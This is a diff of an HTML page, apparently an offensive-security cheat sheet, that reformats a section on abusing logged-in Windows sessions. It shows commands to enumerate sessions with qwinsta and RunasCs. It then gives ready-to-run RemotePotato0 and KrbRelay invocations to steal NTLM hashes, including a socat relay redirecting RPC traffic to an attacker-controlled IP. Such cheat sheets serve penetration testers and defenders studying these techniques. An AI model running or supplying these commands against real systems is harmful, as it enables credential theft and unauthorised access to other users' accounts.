@@ -202,22 +202,38 @@
 
 <div class="content"><hr>
 <h3 id="display-information-about-the-session-host">Display information about the session host</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">qwinsta</span> <span class="p">*</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Or runas</span>
 </span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">x</span> <span class="n">x</span> <span class="n">qwinsta</span> <span class="n">-l</span> <span class="mf">9</span>
-</span></span></code></pre></div><h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
-<h4 id="remotepotato0">RemotePotato0</h4>
-<p><a href="https://github.com/antonioCoco/RemotePotato0">RemotePotato0</a></p>
+</span></span></code></pre></div></div>
+</div></p>
+<br>
+<hr>
+<h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">RemotePotato0</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >KrbRelay</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In local Linux </span>
 </span></span><span class="line"><span class="cl">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Trigger Attack</span>
 </span></span><span class="line"><span class="cl">.<span class="se">\R</span>emotePotato0.exe -m <span class="m">2</span> -s &lt;TARGET_SESSION_ID&gt; -x 10.10.14.10 -p <span class="m">9999</span>
-</span></span></code></pre></div><h4 id="krbrelay">KrbRelay</h4>
-<p><a href="https://github.com/cube0x0/KrbRelay">KrbRelay</a></p>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/antonioCoco/RemotePotato0">RemotePotato0</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.<span class="se">\K</span>rbRelay.exe -session &lt;TARGET_SESSION_ID&gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Or runas</span>
 </span></span><span class="line"><span class="cl">.<span class="se">\R</span>unasCs.exe x x -l <span class="m">9</span> <span class="s2">&#34;C:\ProgramData\KrbRelay.exe -session &lt;TARGET_SESSION_ID&gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&#34;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/cube0x0/KrbRelay">KrbRelay</a></em></small></p></div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
